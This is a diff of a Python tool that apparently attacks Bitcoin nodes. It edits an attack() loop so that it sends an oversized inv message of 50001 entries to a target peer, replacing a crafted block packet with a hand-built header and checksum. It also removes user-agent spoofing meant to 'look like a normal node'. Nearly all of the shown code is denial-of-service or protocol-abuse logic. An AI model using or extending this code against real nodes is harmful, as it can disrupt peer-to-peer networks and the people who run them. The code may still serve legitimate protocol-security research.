@@ -110,40 +110,6 @@ def addr_pkt( str_addrs ):
 def inv_packet():
 	msg = msg_inv(bitcoin_protocolversion)
 	msg.inv = [0] * 50001
-	# Default is /python-bitcoinlib:0.11.0/
-	msg.strSubVer = bitcoin_subversion.encode() # Look like a normal node
-	return msg
-	"""
-	hashPrevBlock = bytearray(random.getrandbits(8) for _ in range(32))
-	hashMerkleRoot = bytearray(random.getrandbits(8) for _ in range(32))
-	nTime = int((datetime.datetime.now() - datetime.datetime(1970, 1, 1)).total_seconds())#.to_bytes(8, 'little')
-	nNonce = random.getrandbits(32)
-	msg = CBlock(
-		nVersion=bitcoin_protocolversion,
-		hashPrevBlock=hashPrevBlock,
-		#hashPrevBlock='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
-		hashMerkleRoot=hashMerkleRoot,
-		#hashMerkleRoot='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
-		nTime=nTime,
-		nBits=0,
-		nNonce=nNonce,
-		vtx=()
-	)
-	name = 'block'
-	f = _BytesIO()
-	msg.stream_serialize(f)
-	body = f.getvalue()
-	res = b'\xf9\xbe\xb4\xd9'
-	res += name.encode()
-	res += b"\x00" * (12 - len(name))
-	res += struct.pack(b"<I", len(body))
-	# add checksum
-	th = hashlib.sha256(body).digest()
-	h = hashlib.sha256(th).digest()
-	res += h[:4]
-	res += body
-	return res
-	"""
 	return msg
 
 # Construct a version packet using python-bitcoinlib
@@ -246,7 +212,7 @@ def attack(socket, src_ip, src_port, dst_ip, dst_port, interface):
 		if seconds_between_version_packets != 0:
 			time.sleep(seconds_between_version_packets)
 		try:
-			socket.send(block_packet_bytes())
+			socket.send(inv_packet().to_bytes())
 		except Exception as e:
 			print(e)
 			break
